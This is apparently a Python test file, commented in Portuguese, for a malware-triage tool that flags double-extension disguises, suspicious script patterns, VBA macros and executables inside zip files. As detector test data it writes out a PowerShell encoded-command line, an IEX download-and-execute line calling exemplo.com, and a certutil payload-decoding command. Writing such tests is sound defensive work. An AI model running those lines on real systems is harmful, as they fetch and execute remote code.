"""
tests/test_investigador.py
=============================
Extensões do "Investigador Universal" (investigador/analise.py):
hash SHA-256 em qualquer arquivo local, aviso de dupla extensão
("fatura.pdf.exe" -- disfarce clássico de malware), análise de scripts
por padrão de texto suspeito (ofuscação/download/execução remota) e
análise de documentos Office (macro VBA embutida).

Nenhum teste aqui baixa/executa nada -- tudo é lido de arquivos
temporários criados pelo próprio teste (`tmp_path`).
"""

import hashlib
import zipfile

import pytest

from investigador import analisar
from investigador.analise import (
    _analisar_office,
    _analisar_script,
    _analisar_zip_generico,
    _checar_dupla_extensao,
    _sha256,
)


# ---------- hash SHA-256 ----------

def test_sha256_bate_com_hashlib_direto(tmp_path):
    arquivo = tmp_path / "teste.txt"
    arquivo.write_bytes(b"conteudo de teste")

    esperado = hashlib.sha256(b"conteudo de teste").hexdigest()
    assert _sha256(str(arquivo)) == esperado


def test_analisar_popula_sha256_pra_qualquer_tipo(tmp_path):
    arquivo = tmp_path / "notas.txt"
    arquivo.write_text("qualquer coisa")

    resultado = analisar(str(arquivo))

    assert "sha256" in resultado["detalhes"]
    assert len(resultado["detalhes"]["sha256"]) == 64


# ---------- dupla extensão (disfarce) ----------

def test_dupla_extensao_detecta_disfarce_classico():
    aviso = _checar_dupla_extensao("fatura.pdf.exe")
    assert aviso is not None
    assert "disfarce" in aviso.lower()


def test_dupla_extensao_nao_acusa_arquivo_normal():
    assert _checar_dupla_extensao("documento.pdf") is None
    assert _checar_dupla_extensao("relatorio_anual.docx") is None


def test_dupla_extensao_nao_acusa_dois_pontos_sem_ser_disfarce():
    # ".tar" não está no conjunto de extensões "documento" usado como isca
    assert _checar_dupla_extensao("backup.tar.gz") is None


def test_analisar_arquivo_local_com_disfarce_avisa_em_primeiro_lugar(tmp_path):
    arquivo = tmp_path / "fatura.pdf.exe"
    arquivo.write_bytes(b"MZ" + b"\x00" * 100)  # cabeçalho PE mínimo o suficiente pra não quebrar _analisar_exe

    resultado = analisar(str(arquivo))

    assert "disfarce" in resultado["indicios_tecnologia"][0].lower()


# ---------- scripts suspeitos ----------

def test_script_com_encoded_command_e_iex_e_sinalizado(tmp_path):
    script = tmp_path / "instalar.ps1"
    script.write_text(
        "powershell -EncodedCommand SQBFAFgA...\n"
        "IEX (New-Object Net.WebClient).DownloadString('http://exemplo.com/x.ps1')\n"
    )

    resultado = _analisar_script(str(script))

    texto = " ".join(resultado["indicios_tecnologia"]).lower()
    assert "encodedcommand" in texto or "base64" in texto
    assert "invoke-expression" in texto or "iex" in texto
    assert "webclient" in texto or "downloadstring" in texto


def test_script_limpo_nao_acusa_nada(tmp_path):
    script = tmp_path / "hello.ps1"
    script.write_text('Write-Host "Olá, mundo!"\n')

    resultado = _analisar_script(str(script))

    assert resultado["indicios_tecnologia"] == ["nenhum padrão suspeito conhecido encontrado no texto do script"]


def test_script_via_analisar_ponto_de_entrada(tmp_path):
    script = tmp_path / "run.bat"
    script.write_text("certutil -decode payload.b64 payload.exe\n")

    resultado = analisar(str(script))

    assert resultado["tipo"] == "script"
    assert any("certutil" in i.lower() for i in resultado["indicios_tecnologia"])


# ---------- documentos Office (macro) ----------

def _criar_docx_falso(caminho, com_macro: bool):
    with zipfile.ZipFile(caminho, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<document/>")
        if com_macro:
            z.writestr("word/vbaProject.bin", b"\x00\x01\x02")


def test_office_com_macro_e_detectado(tmp_path):
    caminho = tmp_path / "planilha.xlsm"
    _criar_docx_falso(caminho, com_macro=True)

    resultado = _analisar_office(str(caminho))

    assert resultado["detalhes"]["contem_macro_vba"] is True
    assert any("macro" in i.lower() for i in resultado["indicios_tecnologia"])


def test_office_sem_macro_nao_acusa(tmp_path):
    caminho = tmp_path / "documento.docx"
    _criar_docx_falso(caminho, com_macro=False)

    resultado = _analisar_office(str(caminho))

    assert resultado["detalhes"]["contem_macro_vba"] is False


def test_office_via_analisar_ponto_de_entrada(tmp_path):
    caminho = tmp_path / "relatorio.docm"
    _criar_docx_falso(caminho, com_macro=True)

    resultado = analisar(str(caminho))

    assert resultado["tipo"] == "documento Office (OOXML)"
    assert "sha256" in resultado["detalhes"]


# ---------- .zip genérico ----------

def test_zip_com_executavel_dentro_e_sinalizado(tmp_path):
    caminho = tmp_path / "pacote.zip"
    with zipfile.ZipFile(caminho, "w") as z:
        z.writestr("leiame.txt", "oi")
        z.writestr("instalador.exe", b"MZ")

    resultado = _analisar_zip_generico(str(caminho))

    assert any("execut" in i.lower() for i in resultado["indicios_tecnologia"])
    assert resultado["detalhes"]["arquivos_dentro"] == 2


def test_zip_com_disfarce_dentro_e_sinalizado(tmp_path):
    caminho = tmp_path / "pacote.zip"
    with zipfile.ZipFile(caminho, "w") as z:
        z.writestr("fatura.pdf.exe", b"MZ")

    resultado = _analisar_zip_generico(str(caminho))

    assert any("disfarce" in i.lower() for i in resultado["indicios_tecnologia"])


def test_zip_limpo_nao_acusa_nada(tmp_path):
    caminho = tmp_path / "fotos.zip"
    with zipfile.ZipFile(caminho, "w") as z:
        z.writestr("foto1.jpg", b"\xff\xd8")

    resultado = _analisar_zip_generico(str(caminho))

    assert resultado["indicios_tecnologia"] == ["nenhum executável/script nem nome de arquivo suspeito encontrado dentro"]
